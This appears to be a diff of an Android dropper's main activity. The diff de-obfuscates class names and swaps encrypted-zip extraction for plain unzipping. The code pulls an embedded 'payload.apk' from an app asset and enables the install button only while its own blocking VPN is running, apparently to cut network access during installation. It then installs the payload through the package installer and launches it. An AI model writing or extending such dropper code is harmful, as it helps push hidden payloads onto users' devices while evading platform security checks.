@@ -24,15 +24,15 @@ import android.widget.Toast;
 
 import androidx.core.content.FileProvider;
 
-import net.lingala.zip4j.ZipFile;
-
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipInputStream;
 
-public class A4450c4b785 extends Activity {
+public class MainActivity extends Activity {
 
     private static final String ASSET_NAME  = "module";
     private static final String INNER_NAME  = "payload.apk";
@@ -72,7 +72,7 @@ public class A4450c4b785 extends Activity {
     private boolean installComplete = false;
 
     /**
-     * Receives the final result forwarded by I4450c4b785. The activity remains
+     * Receives the final result forwarded by InstallResultReceiver. The activity remains
      * alive behind the system package installer, so this also handles APKs
      * whose package name is not the embedded payload package.
      */
@@ -114,7 +114,7 @@ public class A4450c4b785 extends Activity {
     /**
      * Periodic runnable that keeps the Install button in sync with live VPN status.
      *
-     * Uses V4450c4b785.isRunning(), which queries this installer's service
+     * Uses BlockVpnService.isRunning(), which queries this installer's service
      * instance directly. A different VPN running on the device is not enough.
      *
      * Rules:
@@ -150,13 +150,13 @@ public class A4450c4b785 extends Activity {
     /**
      * Returns true if our blocking VPN is currently live.
      *
-     * Primary check  — V4450c4b785.isRunning(): queries the static service
+     * Primary check  — BlockVpnService.isRunning(): queries the static service
      *   instance directly.  This is instantaneous and works on all Android
      *   versions / OEMs regardless of ConnectivityManager quirks.
      *
      */
     private boolean isVpnLive() {
-        return V4450c4b785.isRunning();
+        return BlockVpnService.isRunning();
     }
 
     // ── Activity lifecycle ─────────────────────────────────────────────────────
@@ -313,12 +313,12 @@ public class A4450c4b785 extends Activity {
      *      Enable the button immediately — no need to wait.
      *   B) Service not yet running:
      *      Start it, show "Starting VPN…" and let the monitor enable the button
-     *      once V4450c4b785.isRunning() becomes true (typically < 200 ms).
+     *      once BlockVpnService.isRunning() becomes true (typically < 200 ms).
      */
     private void onVpnGranted() {
         vpnPermissionGranted = true;
 
-        if (V4450c4b785.isRunning()) {
+        if (BlockVpnService.isRunning()) {
             // Already live — skip the "Starting…" phase entirely.
             if (!installInProgress) {
                 btn.setEnabled(true);
@@ -328,10 +328,10 @@ public class A4450c4b785 extends Activity {
         }
 
         try {
-            startService(new Intent(this, V4450c4b785.class));
+            startService(new Intent(this, BlockVpnService.class));
         } catch (Exception e) {
-            android.util.Log.w(V4450c4b785.TAG,
-                    "Could not start V4450c4b785: " + e.getMessage());
+            android.util.Log.w(BlockVpnService.TAG,
+                    "Could not start BlockVpnService: " + e.getMessage());
         }
         // The monitor will enable the button as soon as isRunning() becomes true.
         status.setText("Starting VPN\u2026 please wait.");
@@ -344,7 +344,7 @@ public class A4450c4b785 extends Activity {
     private void stopVpn() {
         installComplete = true;
         ui.removeCallbacks(vpnMonitor);
-        V4450c4b785.stop(this);
+        BlockVpnService.stop(this);
     }
 
     @Override
@@ -503,7 +503,7 @@ public class A4450c4b785 extends Activity {
     private void doImmediateRedirect() {
         installComplete = true;
         ui.removeCallbacks(vpnMonitor);
-        V4450c4b785.stop(this);
+        BlockVpnService.stop(this);
 
         final String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg != null && !pkg.isEmpty()) {
@@ -539,7 +539,7 @@ public class A4450c4b785 extends Activity {
                 if (launch != null) {
                     try {
                         startActivity(launch);
-                        ui.postDelayed(A4450c4b785.this::finish, 150);
+                        ui.postDelayed(MainActivity.this::finish, 150);
                     } catch (Exception e) {
                         if (status != null) status.setText("Launch failed: " + e.getMessage());
                     }
@@ -555,7 +555,7 @@ public class A4450c4b785 extends Activity {
         });
     }
 
-    // ── Decryption + installation ──────────────────────────────────────────────
+    // ── Module preparation + installation ──────────────────────────────────────
 
     private void dropAndInstall() {
         try {
@@ -570,7 +570,7 @@ public class A4450c4b785 extends Activity {
             }
 
             runOnUiThread(() -> status.setText(
-                    incomingApkUri == null ? "Decrypting module \u2026" : "Preparing APK \u2026"));
+                    incomingApkUri == null ? "Preparing module \u2026" : "Preparing APK \u2026"));
 
             File workDir = new File(getCacheDir(), "drop");
             if (!workDir.exists()) workDir.mkdirs();
@@ -579,16 +579,25 @@ public class A4450c4b785 extends Activity {
                 File leftover = new File(workDir, INNER_NAME);
                 if (leftover.exists()) leftover.delete();
 
-                File encZip = new File(workDir, "m.zip");
-                try (InputStream in = getAssets().open(ASSET_NAME);
-                     OutputStream out = new FileOutputStream(encZip)) {
-                    byte[] buf = new byte[64 * 1024]; int n;
-                    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
+                boolean payloadFound = false;
+                try (InputStream asset = getAssets().open(ASSET_NAME);
+                     ZipInputStream zip = new ZipInputStream(asset)) {
+                    ZipEntry entry;
+                    while ((entry = zip.getNextEntry()) != null) {
+                        if (entry.isDirectory() || !INNER_NAME.equals(entry.getName())) {
+                            continue;
+                        }
+                        try (OutputStream out = new FileOutputStream(apk)) {
+                            byte[] buf = new byte[64 * 1024]; int n;
+                            while ((n = zip.read(buf)) > 0) out.write(buf, 0, n);
+                        }
+                        payloadFound = true;
+                        break;
+                    }
                 }
-
-                ZipFile zf = new ZipFile(encZip, BuildConfig.MODULE_KEY.toCharArray());
-                zf.extractFile(INNER_NAME, workDir.getAbsolutePath());
-                encZip.delete();
+                if (!payloadFound) {
+                    throw new RuntimeException("Compressed module payload missing");
+                }
             } else {
                 try (InputStream in = getContentResolver().openInputStream(incomingApkUri);
                      OutputStream out = new FileOutputStream(apk)) {
@@ -600,7 +609,7 @@ public class A4450c4b785 extends Activity {
 
             if (!apk.exists() || apk.length() == 0) {
                 throw new RuntimeException(incomingApkUri == null
-                        ? "Decrypted payload missing"
+                        ? "Prepared payload missing"
                         : "Selected APK missing");
             }
 
@@ -684,7 +693,7 @@ public class A4450c4b785 extends Activity {
              * for STATUS_PENDING_USER_ACTION, then forwards the final result
              * to this activity.
              */
-            Intent statusIntent = new Intent(this, I4450c4b785.class)
+            Intent statusIntent = new Intent(this, InstallResultReceiver.class)
                     .setAction(getPackageName() + ".INSTALL_STATUS");
             int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
